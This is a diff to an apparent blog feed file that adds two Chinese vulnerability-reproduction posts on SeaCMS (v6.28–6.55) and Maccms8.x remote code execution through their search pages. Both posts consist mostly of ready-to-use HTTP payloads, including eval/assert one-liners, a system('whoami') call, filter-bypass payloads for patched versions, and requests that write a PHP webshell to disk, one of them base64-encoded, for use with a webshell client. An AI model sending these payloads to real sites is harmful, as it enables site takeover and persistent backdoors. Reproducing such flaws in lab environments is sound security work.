@@ -4,6 +4,68 @@
   
     
     <entry>
+      <title>海洋cms(SEACMS) 漏洞整合复现</title>
+      <link href="/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
+      <url>/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>海洋CMS V6.28 存在命令执行漏洞，漏洞具体内容参见：<br><a href="https://www.uedbox.com/post/8857/" target="_blank" rel="noopener"> 海洋CMS V6.28 命令执行 0DAY</a></p><p>在2017年2月，海洋CMS 6.45版本存在一个前台getshell漏洞，漏洞具体内容参见：<br><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">SeaCMS v6.45前台Getshell 代码执行漏洞分析</a><br><a href="http://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">Seacms漏洞分析利用复现 By Assassin - Assassin - CSDN博客</a><br>该漏洞成因在于search.php没有对用户输入内容进行过滤，导致攻击者提交的order参数可进入parseIf函数中执行eval。  </p><p>官方在6.46版中修复了该漏洞，修复方法是对用户输入的参数进行过滤并限制长度为20个字符。<br>但这种修复方法并没有完全修复漏洞，因为在替换操作过程中用户输入的几个参数可以进行组合，因此补丁被绕过。  </p><p>随后官方又在8月7日发布了6.54版本再次修复漏洞，这次修复增加了一句：</p><p><code>$order = ($order == &quot;commend&quot; || $order == &quot;time&quot; || $order == &quot;hit&quot;) ? $order : &quot;&quot;;</code></p><p>即限制了order参数只能是固定内容，这样虽然避免了通过order参数进行的攻击，但是却没有解决其他参数进入parseIf函数的问题。</p><p><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a></p><p>6.54版本更新中，官方给出的修复是在parseIf函数里面加了黑名单。<br>但是没有做SERVER变量的过滤，所以可以用SERVER变量的性质来达到写入命令。<br> <a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><h2 id="海洋CMS-V6-28"><a href="#海洋CMS-V6-28" class="headerlink" title="海洋CMS V6.28"></a>海洋CMS V6.28</h2><p>详见：<br><a href="https://www.uedbox.com/post/8857/" target="_blank" rel="noopener"> 海洋CMS V6.28 命令执行 0DAY</a></p><p>一句话payload，密码<code>cmd</code>: </p><p><code>url+/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</code></p><h2 id="海洋CMS-V6-45"><a href="#海洋CMS-V6-45" class="headerlink" title="海洋CMS V6.45"></a>海洋CMS V6.45</h2><p>详见：<br><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">SeaCMS v6.45前台Getshell 代码执行漏洞分析</a></p><p>path:<br><code>url+/search.php</code><br>POST:<br><code>searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}</code></p><p><a href="https://www.cnblogs.com/sqyysec/p/7765703.html" target="_blank" rel="noopener">【代码审计】seacms 前台Getshell分析</a></p><p>path:<br><code>url+/search.php</code></p><pre><code>searchtype=5&amp;searchword=d&amp;order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&amp;func=assert&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105090018.png" alt></p><p><a href="https://www.cnblogs.com/bay1/p/10982344.html" target="_blank" rel="noopener">seacms最新版前台getshell</a><br>一句话payload，文件<code>test.php</code>  密码<code>pass</code>:<br>path:<br><code>url+/search.php</code></p><pre><code>}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&amp;func=assert&amp;cmd=fwrite(fopen(&quot;test.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&#39;)</code></pre><h2 id="海洋CMS-V6-54"><a href="#海洋CMS-V6-54" class="headerlink" title="海洋CMS V6.54"></a>海洋CMS V6.54</h2><p>详见：<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a><br><a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p><p>path:<br><code>url+/search.php</code><br>POST:</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105092054.png" alt></p><p>命令执行payload</p><p>path:<br><code>url+/search.php</code><br>POST:</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(&quot;whoami&quot;);</code></pre><p>url一句话拿shell<br>详见：<br><a href="https://zzreno.github.io/2019/05/19/记一次海洋cms任意代码执行漏洞拿shell-url一句话马/" target="_blank" rel="noopener">记一次海洋cms任意代码执行漏洞拿shell(url一句话马)</a></p><p>权限足够的话，<code>file_put_concents(“connect.php”,”“)</code>，然后连接菜刀即可。<br>权限不足的话，利用payload构造url：</p><p><code>url+/search.php?searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))</code></p><p>连接放入菜刀，密码是 <code>9[]</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105094457.png" alt></p><h2 id="海洋CMS-V6-55"><a href="#海洋CMS-V6-55" class="headerlink" title="海洋CMS V6.55"></a>海洋CMS V6.55</h2><p>详见：<br><a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p><p>path:<br><code>url+/search.php</code><br>POST:</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.uedbox.com/post/8857/" target="_blank" rel="noopener"> 海洋CMS V6.28 命令执行 0DAY</a><br><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">SeaCMS v6.45前台Getshell 代码执行漏洞分析</a><br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a><br><a href="https://zzreno.github.io/2019/05/19/记一次海洋cms任意代码执行漏洞拿shell-url一句话马/" target="_blank" rel="noopener">记一次海洋cms任意代码执行漏洞拿shell(url一句话马)</a><br><a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> Command Execution </tag>
+            
+            <tag> 海洋cms </tag>
+            
+            <tag> Seacms </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Maccms8.x(苹果cms)命令执行漏洞复现</title>
+      <link href="/2019/11/04/maccms8.x-ming-ling-zhi-xing-lou-dong-fu-xian-ping-guo-cms/"/>
+      <url>/2019/11/04/maccms8.x-ming-ling-zhi-xing-lou-dong-fu-xian-ping-guo-cms/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>村里刚通网，复现下maccms的命令执行漏洞<br>该漏洞主要的产生原因是CMS搜索页面搜索参数过滤不严<br>导致直接eval执行PHP语句，前台命令执行可getshell</p><h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><p><strong>Maccms8.x</strong></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载Github上的环境：<br><a href="https://github.com/yaofeifly/Maccms8.x" target="_blank" rel="noopener">Maccms8.x源码</a></p><p>然后使用<code>phpstudy</code>搭建安装即可<br>也可自己搭建<code>Apache+Mysql+php</code>环境安装</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104164824.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload：</p><p><code>url+/index.php?m=vod-search&amp;wd={if-A:phpinfo()}{endif-A}</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104165220.png" alt></p><p>getshell payload（a）:</p><p><code>url+/index.php?m=vod-search&amp;wd={if-A:assert($_POST[a])}{endif-A}</code><br>POST<br><code>a=phpinfo()</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104170625.png" alt></p><p>写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）:</p><p><code>url+/index.php?m=vod-search</code></p><pre><code>wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A}</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104173840.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104174007.png" alt></p><h1 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h1><p><a href="https://blog.csdn.net/m0_37438418/article/details/81006161" target="_blank" rel="noopener">苹果CMS漏洞</a><br><a href="https://github.com/yaofeifly/Maccms8.x" target="_blank" rel="noopener">Maccms8.x: Maccms8.x</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> Maccms </tag>
+            
+            <tag> 苹果cms </tag>
+            
+            <tag> Command Execution </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Wordpress未授权访问漏洞复现(CVE-2019-17671)</title>
       <link href="/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/"/>
       <url>/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/</url>
